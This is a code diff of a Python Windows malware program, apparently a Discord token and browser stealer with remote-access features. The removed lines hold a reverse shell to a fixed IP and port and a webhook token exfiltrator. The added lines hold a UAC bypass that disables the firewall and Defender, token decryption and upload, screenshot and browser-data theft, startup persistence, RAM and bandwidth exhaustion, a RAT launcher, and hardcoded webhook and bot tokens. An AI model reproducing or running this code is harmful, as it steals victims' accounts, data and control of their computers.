@@ -1,37 +1,63 @@
-try:
-    import os
-    import requests
-    import subprocess
-    import time
-    import threading
-    import winreg
-    from re import findall
-    from json import loads, dumps
-    from base64 import b64decode
-    from subprocess import Popen, PIPE
-    from urllib.request import Request, urlopen
-    from threading import Thread
-    from sys import argv
-    import asyncio
-    from Crypto.Cipher import AES
-    import httpx
-    import json
-    import socket
-    import shutil
-    import tempfile
-    import sys
-except:
+import os
+import requests
+import subprocess
+import time
+import threading
+import winreg
+from re import findall
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from threading import Thread
+from sys import argv
+import asyncio
+from Crypto.Cipher import AES
+import httpx
+import json
+import socket
+import shutil
+import tempfile
+import sys
+import discord
+import discordc
+import re
+import win32con
+import ctypes
+import webbrowser
+from json import loads as json_loads
+from discord.ext import commands
+import psutil
+from sysinf import send_device_information   
+from config import Config
+from _webhook import _WebhookX
+from PIL import ImageGrab
+from dhooks import Embed
+from dhooks import File
+from datetime import datetime
+from win32crypt import CryptUnprotectData
+from _random_string import get_random_string
+from browser import Browsers
+from uacbypass import GetSelf, IsAdmin, UACbypass
+import drat
+
+
+""""
+except Exception as e:
+    print(e)
     import time
     import os
     import sys
     input("Found missing modules. Press enter to install them.")
     print("Installing missing modules in 3 seconds. CTRL + C to cancel.")
     time.sleep(3.0)
-    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install PIL-tools && pip install colorama && pip install win10toast")
+    os.system("pip install requests && pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install aes && pip install discord")
     os.system("cls")
     print("Installed the missing modules successfully. Please restart the client. Closing this terminal in 10 seconds.")
     time.sleep(10)
     sys.exit
+
+"""    
 
 # Configuration
 WEBHOOK_URL = "https://discord.com/api/webhooks/1334408432509386822/CyA9d0WeYAqJeaIUuept2SNoN2x0CO7o6gx530fHG0D6XJdLQ9vLsKQBaAeGl3Ap5g8s"
@@ -53,10 +79,55 @@ baseurl = "https://discord.com/api/v9/users/@me"
 tokens = []
 SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
 CURRENT_VERSION = "1.0.0"
-UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
+UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
+DISCORD_BOT_TOKEN = "MTMzNTExNTU1ODYzODcxOTA4OA.G_aN-A.iQksq1qD0MVPcVdhDljhJ2-1m9nIkh1E-AyyE0"
+COMMAND_PREFIX = "!"
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
+connected_clients = {}
+ram_eater_active = False
+bandwidth_eater_active = False
+running_commands = []
+cc = Config()
+main_path = os.path.join(os.getenv("APPDATA"), 'republicofwadiya')
+wh_avatar = cc.get_avatar()
+wh_name = cc.get_name()
+eb_color = cc.get_color()
+eb_footer = cc.get_footer()
+webhook = cc.get_webhook()
+Threadlist = []
+changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
+roaming = os.getenv("APPDATA")
+hostname = socket.gethostname()
+
+if not os.path.exists(main_path):
+    try:
+        os.mkdir(main_path)
+    except Exception as e:
+        print(e)
+
+def send_error_notification(exception, type):
+    webx = _WebhookX().get_object()
+
+    embed = Embed(
+        title='WIA Report',
+        description='Citadel Instance - Error',
+        color=eb_color,
+        timestamp=datetime.now().isoformat()
+    )
+
+    embed.set_author(name=wh_name, icon_url=wh_avatar)
+    embed.set_footer(text=eb_footer, icon_url=wh_avatar)
+    embed.add_field(name=f"Error in {type} occured | Fcuk pogy", value=f'`{exception}`', inline=False)
+
+    webx.send(embed=embed)
 
 def debug(message):
     print(f"[DEBUG] {message}")
+
+
+
 
 def check_for_updates():
     try:
@@ -94,77 +165,40 @@ def download_latest_script():
         print(f"[-] Error updating script: {e}")        
 
 
-
-def connect_to_server(host='140.245.13.186', port=4444):
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        client_socket.connect((host, port))
-        print(f"[+] Connected to {host}:{port}")
-
-        while True:
-            command = client_socket.recv(4096).decode().strip()
-
-            if command.lower() in ["exit", "quit"]:
-                break
-
-            if command.startswith("cd "):
-                try:
-                    os.chdir(command[3:].strip())
-                    response = f"Changed directory to: {os.getcwd()}\n"
-                except Exception as e:
-                    response = str(e) + "\n"
-
-            else:
-                try:
-                    process = subprocess.Popen(
-                        command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        stdin=subprocess.PIPE,
-                        text=True
-                    )
-
-                    stdout, stderr = process.communicate()
-                    response = stdout + stderr
-                    response += f"\nCommand exited with code: {process.returncode}\n"
-
-                except Exception as e:
-                    response = str(e) + "\n"
-
-            client_socket.send(response.encode())
-
-    except Exception as e:
-        print(f"[-] Error: {e}")
-    finally:
-        client_socket.close()
+check_for_updates()
 
 
-# RAM Consumption
+# ram eater
 def eat_ram():
+    global ram_eater_active
     debug("Starting RAM consumption...")
     try:
         x = []
-        while True:
-            x.append(bytearray(50000000))
+        while ram_eater_active:
+            x.append(bytearray(100000000))
             time.sleep(0.5)
     except MemoryError:
         debug("RAM consumption stopped due to memory error.")
     except Exception as e:
         debug(f"Error in eat_ram: {e}")
+    finally:
+        ram_eater_active = False
 
-# Bandwidth Consumption
+
+# internet eater
 def eat_bandwidth():
+    global bandwidth_eater_active
     debug("Starting bandwidth consumption...")
-    while True:
+    while bandwidth_eater_active:
         try:
-            requests.get("http://speed.hetzner.de/1GB.bin")
+            requests.get("http://speedtest.tele2.net/10GB.zip")
         except Exception as e:
             debug(f"Error in eat_bandwidth: {e}")
         time.sleep(1)
 
-# Add to Startup
+
+
+# add to styartup
 def add_to_startup():
     debug("Adding to startup...")
     try:
@@ -178,36 +212,8 @@ def add_to_startup():
     except Exception as e:
         debug(f"Error adding to startup: {e}")
 
-# Command Listener
-def listen_for_commands():
-    debug("Starting command listener...")
-    while True:
-        try:
-            response = requests.get(f"{CONTROL_SERVER}/command").json()
-            command = response.get("command")
-            if command and isinstance(command, str):
-                debug(f"Received command: {command}")
-                if command == "ram":
-                    try:
-                        threading.Thread(target=eat_ram).start()
-                    except Exception as e:
-                        debug(f"Error starting RAM thread: {e}")
-                elif command == "bandwidth":
-                    try:
-                        threading.Thread(target=eat_bandwidth).start()
-                    except Exception as e:
-                        debug(f"Error starting bandwidth thread: {e}")
-                elif command == "rdp":
-                    start_rdp_tunnel()
-                else:
-                    debug(f"Unknown command: {command}")
-            else:
-                debug("Received empty or invalid command.")
-        except Exception as e:
-            debug(f"Error in listen_for_commands: {e}")
-        time.sleep(5)
 
-# Discord Token Grabber
+# gaming
 def getHeader(token=None, content_type="application/json"):
     headers = {
         "Content-Type": content_type,
@@ -271,236 +277,201 @@ def try_extract(func):
                 pass
         return wrapper
 
-@staticmethod
-def get_master_key(path) -> str:
-    with open(path, "r", encoding="utf-8") as f:
-        c = f.read()
-    local_state = json.loads(c)
 
+
+async def send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id):
+    embed = discord.Embed(
+        color=0x7289da,
+        title="Republic of Wadiya Intelligence Report",
+        description="Details about the moga's account and system."
+    )
+
+
+    embed.add_field(
+        name="|Account Info|",
+        value=f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+        inline=True
+    )
+    embed.add_field(
+        name="|PC Info|",
+        value=f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
+        inline=True
+    )
+    embed.add_field(
+        name="|More Info|",
+        value=f"HWID: {hwid}\nToken: {token}",
+        inline=False
+    )
+    embed.add_field(
+        name="**Tokens:**",
+        value=f"```yaml\n{tokens if tokens else 'No tokens extracted'}\n```",
+        inline=False
+    )
+
+    embed.set_author(
+        name=username,
+        icon_url=f"https://cdn.discordapp.com/avatars/{user_id}.png?size=32"
+    )
+    embed.set_footer(text="Zitemaker")
+
+
+    channel = bot.get_channel(1335115941444587614)
+    await channel.send(embed=embed)                            
+
+async def start_bot():
+    await bot.start(DISCORD_BOT_TOKEN)
+
+
+if cc.get_uac_bypass():
+    try:
+        if not IsAdmin():
+            if GetSelf()[1]:
+                if UACbypass():
+                    subprocess.run('netsh advfirewall set domainprofile state off', shell=True)
+                    subprocess.run(r'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1', shell=True)
+    except Exception as e:
+        send_error_notification(e, 'Wadiyan UAC Bypass')        
+
+def DecryptValue(buff, master_key=None):
+    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
+    if starts in ("v10", "v11"):
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+Tokens = ""
+dclass = discordc.DiscordX()
+
+def GetDiscord(path, arg):
+    if not os.path.exists(f"{path}/Local State"):
+        return
+
+    pathC = path + arg
+
+    pathKey = path + "/Local State"
+    with open(pathKey, "r", encoding="utf-8") as f:
+        local_state = json_loads(f.read())
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key        
+    master_key = CryptUnprotectData(master_key[5:])
+    print(path, master_key)
+
+    for file in os.listdir(pathC):
+        print(path, file)
+        if file.endswith(".log") or file.endswith(".ldb"):
+            for line in [
+                    x.strip() for x in open(f"{pathC}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
+            ]:
+                for token in re.findall(
+                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global Tokens
+                    tokenDecoded = DecryptValue(
+                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
+                    if dclass.checkToken(
+                            tokenDecoded) and tokenDecoded not in Tokens:
+                        print(token)
+                        Tokens += tokenDecoded
+                        # writeforfile(Tokens, 'tokens')
+                        dclass.uploadToken(tokenDecoded)
+
+def GetTokens(path, arg):
+    if not os.path.exists(path):
+        return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(".log") or file.endswith(".ldb"):
+            for line in [
+                    x.strip() for x in open(f"{path}\\{file}",
+                                            errors="ignore").readlines()
+                    if x.strip()
+            ]:
+                for regex in (
+                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
+                        r"mfa\.[\w-]{80,95}",
+                ):
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if dclass.checkToken(token) and token not in Tokens:
+                            Tokens += token
+                            dclass.uploadToken(token)
+
+discordPaths = [
+    [f"{roaming}/Discord", "/Local Storage/leveldb"],
+    [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+    [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+    [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+]
+
+if cc.get_token_stealing():
+    for patt in discordPaths:
+            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
+            a.start()
+            Threadlist.append(a)    
 
 
-@staticmethod
-def decrypt_val(buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return "Failed to decrypt password"
 
-
-
-def getHeaders(token: str = None):
-        headers = {
-            "Content-Type": "application/json",
-        }
-        if token:
-            headers.update({"Authorization": token})
-        return headers
-
-async def checkToken(tkn: str) -> str:
-        try:
-            r = httpx.get(
-                url=baseurl,
-                headers=getHeaders(tkn),
-                timeout=5.0
-            )
-        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
-            pass
-        if r.status_code == 200 and tkn not in tokens:
-            tokens.append(tkn)
-
-
-@staticmethod
-def decrypt_val(buff, master_key) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return "Failed to decrypt password"
-
-
-def send_token_to_webhook(token):
-    """Send the token via webhook"""
-    payload = {
-        "content": f"New Discord Token: {token}"
-    }
+if cc.get_screenshot():
     try:
-        response = requests.post(WEBHOOK_URL, data=payload)
-        if response.status_code == 204:
-            print(f"Token sent successfully: {token}")
-        else:
-            print(f"Failed to send token, status code: {response.status_code}")
+        rndm_strr = get_random_string(5)
+        path = os.path.join(main_path, f"screenshot_{rndm_strr}.png")
+        screenshot = ImageGrab.grab()        
+        screenshot.save(path)
+        
+        webx = _WebhookX().get_object()
+
+        embed = Embed(
+            title='WIA Report',
+            description='Citadel Instance - Screenshot',
+            color=eb_color,
+            timestamp=datetime.now().isoformat()
+        )
+
+        embed.set_author(name=wh_name, icon_url=wh_avatar)
+        embed.set_footer(text=eb_footer, icon_url=wh_avatar)
+
+        file = File(path, name='screenshot.png')
+
+        embed.set_image(url=f"attachment://screenshot.png")
+        
+        webx.send(embed=embed, file=file)
+        
+        os.remove(path)
     except Exception as e:
-        print(f"Error sending token to webhook: {e}")
+        send_error_notification(e, 'Wadiyan Screenshot Stealer')
 
-@try_extract
-def grabTokens():
-        paths = {
-            'Discord': ROAMING + r'\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': ROAMING + r'\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': ROAMING + r'\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': ROAMING + r'\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': ROAMING + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': ROAMING + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': LOCAL + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': LOCAL + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': LOCAL + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': LOCAL + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': LOCAL + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': LOCAL + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': LOCAL + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': LOCAL + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': LOCAL + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': LOCAL + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': LOCAL + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': LOCAL + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Uran': LOCAL + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': LOCAL + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': LOCAL + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': LOCAL + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-        }
 
-        for name, path in paths.items():
-            if not os.path.exists(path):
-                continue
-            disc = name.replace(" ", "").lower()
-            if "cord" in path:
-                if os.path.exists(ROAMING+f'\\{disc}\\Local State'):
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(encrypted_regex, line):
-                                token = decrypt_val(b64decode(
-                                    y.split('dQw4w9WgXcQ:')[1]), get_master_key(ROAMING+f'\\{disc}\\Local State'))
-                                asyncio.run(checkToken(token))
-            else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
-                            asyncio.run(checkToken(token))
+if cc.get_browser_stealing():
+    try:
+        browsers = Browsers(webhook)
+    except Exception as e:
+        send_error_notification(e, 'Wadiyan Browser Stealer')    
 
-        if os.path.exists(ROAMING+"\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(ROAMING+"\\Mozilla\\Firefox\\Profiles"):
-                for _file in files:
-                    if not _file.endswith('.sqlite'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in findall(regex, line):
-                            asyncio.run(checkToken(token))
+
+send_device_information()
+add_to_startup()
+drat.run_rat()
 
 
 
-def main():
+"""
+async def main():
     debug("Starting main function...")
-    cache_path = ROAMING + "\\.cache~$"
-    embeds = []
-    working = []
-    checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = whoTheFuckAmI() 
-    pc_username = os.getenv("UserName") 
-    pc_name = os.getenv("COMPUTERNAME")
-    user_path_name = os.getenv("userprofile").split("\\")[2]
-
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-        for token in getTokenz(path): 
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
-
-
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
-                    continue
-
-
-            user_data = getUserData(token)
-            if not user_data:
-                debug(f"Invalid token or failed to get user data for token: {token}")
-                user_data = None 
-
-            working_ids.append(uid)
-            working.append(token)
-
-
-            username = user_data["username"] + "#" + str(user_data["discriminator"]) if user_data else "N/A"
-            user_id = user_data["id"] if user_data else "N/A"
-            email = user_data.get("email") if user_data else "N/A"
-            phone = user_data.get("phone") if user_data else "N/A"
-            nitro = bool(user_data.get("premium_type")) if user_data else False
-            billing = bool(paymentMethods(token)) if user_data else False
-
-
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "|Account Info|",
-                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|PC Info|",
-                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
-                        "inline": True
-                    },
-                    {
-                        "name": "|More Info|",
-                        "value": f"HWID: {hWiD()}\nToken: {token}",
-                        "inline": False
-                    },
-                    {
-                        'name': '**Tokens:**',
-                        'value': f'''```yaml
-                        {tokens if tokens else "No tokens extracted"}```
-                        '''.replace(' ', ''),
-                        'inline': False
-                        }
-                ],
-                "author": {"name": username, "icon_url": "https://cdn.discordapp.com/avatars/" + str(user_id) + ".png?size=32"},
-                "footer": {"text": "Zitemaker"}
-            }
-
-            embeds.append(embed)
-
-
-    data = {
-        "embeds": embeds
-    }
-
-    try:
-        requests.post(WEBHOOK_URL, json=data)
-        debug("Data sent to webhook successfully.")
-    except Exception as e:
-        debug(f"Error sending data to webhook: {e}")
+    
+    add_to_startup()
+    #run_in_background()
+    loop.create_task(start_bot())
+    loop.create_task(send_device_information())
 
 if __name__ == "__main__":
-    check_for_updates()
-    main()
-    connect_to_server()
-    main_thread = threading.Thread(target=listen_for_commands)
-    main_thread.start()
-    main_thread.join()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    loop.run_until_complete(main())
+    loop.run_forever()
+
+"""
